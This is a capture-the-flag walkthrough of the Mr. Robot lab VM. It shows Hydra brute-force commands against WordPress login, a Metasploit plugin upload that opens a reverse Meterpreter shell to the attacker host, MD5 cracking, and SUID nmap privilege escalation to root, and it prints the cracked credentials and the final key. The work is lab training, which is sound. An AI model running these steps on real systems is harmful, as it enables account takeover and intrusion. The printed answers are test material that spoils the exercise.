## Detailed Findings

## Phase 1: Reconnaissance

### Network Discovery

The target VM was identified on the local network using standard network scanning techniques. The VM obtained its IP address via DHCP, which was determined to be 192.168.1.56.

### Port Scanning

A comprehensive port scan was conducted using Nmap to identify open ports and running services:

**Command executed:**

```bash
nmap -sV -sC 192.168.1.56
```

**Scan results:**

![[Pasted image 20250401174931.png]]

**Detailed findings:**

- **Port 22/TCP**: OpenSSH service (version not disclosed)
- **Port 80/TCP**: Apache HTTP server
- HTTP title: "Site doesn't have a title"
- Server header: Apache
- **Port 443/TCP**: Apache HTTPS server
- HTTP title: "Site doesn't have a title"
- Server header: Apache
- SSL Certificate: Subject CommonName=[www.example.com](http://www.example.com)
- SSL Certificate validity: 2015-09-16T10:45:03 to 2025-09-13T10:45:03
- **MAC Address**: 08:00:27:04:32:B8 (Oracle VirtualBox virtual NIC)

**Analysis:**
The target system is running a web server on both HTTP and HTTPS ports, which presents potential attack vectors through web application vulnerabilities. The SSH service could potentially be used for remote access if credentials are obtained. The SSL certificate appears to be using default values, suggesting the web server might not be properly configured for production use.

## Phase 2: Information Gathering

### Web Application Analysis

Initial access to the web server on port 80 revealed a themed interface based on the Mr. Robot TV series:

![[Pasted image 20250401174951.png]]

The web interface presented an interactive terminal-like experience with several commands available:

- prepare
- fsociety
- inform
- question
- wakeup
- join


Testing these commands revealed they were primarily for aesthetic purposes, displaying videos and themed content related to the TV show. No immediate vulnerabilities were identified in this interface.

### Discovery of robots.txt

Following standard web application enumeration procedures, the robots.txt file was examined:

![[Pasted image 20250401175005.png]]

**Key discoveries:**

1. **key-1-of-3.txt**: Direct reference to the first key
2. **fsocity.dic**: A dictionary file, potentially useful for brute force attacks


**First key acquisition:**
The first key was obtained by directly accessing the key-1-of-3.txt file referenced in robots.txt.

### Dictionary File Analysis

The fsocity.dic file was downloaded for further analysis:

**Command executed:**

```bash
wget http://192.168.1.56/fsocity.dic
```

**Download results:**

![[Pasted image 20250401175019.png]]

Initial examination of the file revealed it to be a wordlist:

**Command executed:**

```bash
head fsocity.dic
```

**File contents preview:**

![[Pasted image 20250401175028.png]]

**Wordlist optimization:**
Analysis of the wordlist revealed numerous duplicate entries. To optimize for potential brute force attacks, duplicates were removed:

**Commands executed:**

```bash
wc -l fsocity.dic
# Result: 858160 words

sort fsocity.dic | uniq | wc -l
# Result: 11451 unique words

sort fsocity.dic | uniq > fsocity_filtered.dic
```

**Analysis:**
The significant reduction in wordlist size (from 858,160 to 11,451 entries) would dramatically improve the efficiency of any brute force attacks, reducing the time required by approximately 98.7%.

### Directory Enumeration

Directory enumeration was performed using Dirbuster with the default wordlist:

**Key discovery:**

- **/wp-admin/**: WordPress administration panel

### WordPress Identification

The discovery of the wp-admin directory confirmed the presence of a WordPress installation:

![[Pasted image 20250401175042.png]]

Further analysis using the Wappalyzer browser extension provided detailed information about the web application stack:

![[Pasted image 20250401175053.png]]

**Detailed technology stack:**

- **CMS**: WordPress 5.4.2
- **Web Server**: Apache
- **Programming Language**: PHP 7.3
- **Database**: MySQL
- **JavaScript Libraries**: Various
- **Analytics**: Google Analytics, WP-Statistics 12.6.13
- **SEO**: Yoast SEO 14.3
- **Miscellaneous**: Twitter Emoji, Gravatar

**Analysis:**
The WordPress installation provides multiple potential attack vectors, including:

- Authentication bypass
- Credential brute forcing
- Plugin vulnerabilities
- Theme vulnerabilities
- Core WordPress vulnerabilities specific to version 5.4.2

## Phase 3: Exploitation

### WordPress Username Enumeration

The WordPress login form was analyzed for security vulnerabilities. Testing revealed a critical information disclosure vulnerability in the error messages:

**Behavior observed:**

- When an invalid username was submitted: "ERROR: Invalid username. Lost your password?"
- When a valid username with incorrect password was submitted: "ERROR: The password you entered for the username [username] is incorrect."


This difference in error messages allows an attacker to enumerate valid usernames on the system.

### Login Request Analysis

To prepare for automated brute force attacks, the WordPress login request structure was analyzed using Burp Suite as a proxy:

![[Pasted image 20250401175108.png]]

**Request details:**

- **Method**: POST
- **Target**: /wp-login.php
- **Content-Type**: application/x-www-form-urlencoded
- **Key parameters**:

- `log`: Username field
- `pwd`: Password field
- `wp-submit`: Form submission identifier

### Credential Brute Force

Based on the request analysis and username enumeration vulnerability, the Hydra tool was used to automate the brute force process:

**Step 1: Username enumeration**
**Command executed:**

```bash
hydra -L fsocity_filtered.dic -p something 192.168.1.56 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

**Execution results:**

![[Pasted image 20250401175121.png]]

**Valid username discovered:** `elliot`

**Step 2: Password brute force**
**Command executed:**

```bash
hydra -l elliot -P fsocity_filtered.dic 192.168.1.56 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

**Execution results:**

![[Pasted image 20250401175132.png]]

**Valid credentials discovered:**

- **Username**: `elliot`
- **Password**: `ER28-0652`


**Analysis:**
The successful brute force attack yielded valid administrator credentials for the WordPress installation. The reference to "ER28-0652" is notable as it appears to be a reference to the Mr. Robot TV series, demonstrating how themed or contextual passwords can sometimes be predictable.

### WordPress Admin Access

Using the discovered credentials, access to the WordPress admin panel was obtained. Exploration of the WordPress dashboard revealed:

- WordPress version 5.4.2
- Limited content (no posts or pages)
- One additional user: mich05654 (non-administrator)
- Full administrative privileges for the elliot user


### WordPress Shell Upload

To establish a persistent foothold on the system, Metasploit was used to upload a malicious WordPress plugin:

**Commands executed:**

```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.56
set USERNAME elliot
set PASSWORD ER28-0652
set wpcheck false
exploit
```

**Execution results:**

![[Pasted image 20250401175144.png]]

**Key events:**

1. Reverse TCP handler started on attacker machine (192.168.1.15:4444)
2. Authentication to WordPress using elliot:ER28-0652
3. Malicious plugin uploaded to /wp-content/plugins/FzjbyIiJKK/xKPIqAnqvw.php
4. Meterpreter session established


**Analysis:**
The successful exploitation provided a Meterpreter session on the target system, allowing for further post-exploitation activities. The wp_admin_shell_upload module leverages the WordPress plugin upload functionality to deploy a malicious PHP file that establishes a reverse shell connection.

## Phase 4: Post-Exploitation

### System Exploration

Using the established Meterpreter session, the target system was explored to identify sensitive information and potential privilege escalation vectors:

**Command executed in Meterpreter:**

```bash
shell
```

A Python one-liner was used to spawn a fully interactive TTY shell:

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

### User Account Discovery

Exploration of the /home directory revealed a user account named 'robot'. In this user's home directory (/home/robot), two critical files were discovered:

- **key-2-of-3.txt**: The second key file
- **password.raw-md5**: A file containing an MD5 password hash


**File permissions analysis:**

- key-2-of-3.txt: Readable only by the 'robot' user
- password.raw-md5: World-readable


**Contents of password.raw-md5:**

```plaintext
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Password Hash Cracking

The discovered MD5 hash was submitted to an online cracking service (Crackstation) for analysis:

![[Pasted image 20250401175207.png]]

**Cracked password:** `abcdefghijklmnopqrstuvwxyz`

**Analysis:**
The password is a simple alphabetic sequence, demonstrating poor password security practices. The use of MD5 for password hashing is also concerning, as MD5 is considered cryptographically broken and unsuitable for secure password storage.

### Lateral Movement

Using the cracked password, lateral movement to the 'robot' user account was performed:

**Commands executed:**

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

**Execution results:**

![[Pasted image 20250401175215.png]]

**Second key acquisition:**
After successfully switching to the 'robot' user, the second key was accessed from key-2-of-3.txt.

### Privilege Escalation Enumeration

To identify potential privilege escalation vectors, SUID binaries were enumerated:

**Command executed:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Execution results:**

![[Pasted image 20250401175244.png]]

**SUID binaries identified:**

- **/bin/ping**
- **/bin/umount**
- **/bin/mount**
- **/bin/ping6**
- **/bin/su**
- **/usr/bin/passwd**
- **/usr/bin/newgrp**
- **/usr/bin/chsh**
- **/usr/bin/chfn**
- **/usr/bin/gpasswd**
- **/usr/bin/sudo**
- **/usr/local/bin/nmap**
- **/usr/lib/openssh/ssh-keysign**
- **/usr/lib/eject/dmcrypt-get-device**
- **/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper**
- **/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper**
- **/usr/lib/pt_chown**


**Analysis:**
The presence of /usr/local/bin/nmap with the SUID bit set is particularly noteworthy. Nmap is a network scanning tool that is not typically configured with SUID permissions. This misconfiguration presents a potential privilege escalation vector, as older versions of Nmap include an interactive mode that can execute shell commands as the owner of the binary (root).

### Privilege Escalation via Nmap

The Nmap SUID binary was leveraged to escalate privileges to root:

**Commands executed:**

```bash
nmap --interactive
```

**Execution results:**

![[Pasted image 20250401175257.png]]

Once in interactive mode, shell commands could be executed with root privileges using the '!' prefix:

**Commands executed in nmap interactive mode:**

```bash
!ls /root
!cat /root/key-3-of-3.txt
```

**Execution results:**

![[Pasted image 20250401175312.png]]

**Third key acquisition:**
The third and final key was successfully retrieved from /root/key-3-of-3.txt with the value: `04787ddef27c3dee1ee161b21670b4e4`

**Analysis:**
The privilege escalation was successful due to the misconfiguration of the Nmap binary with SUID permissions. This allowed execution of commands with root privileges, effectively bypassing all system access controls.
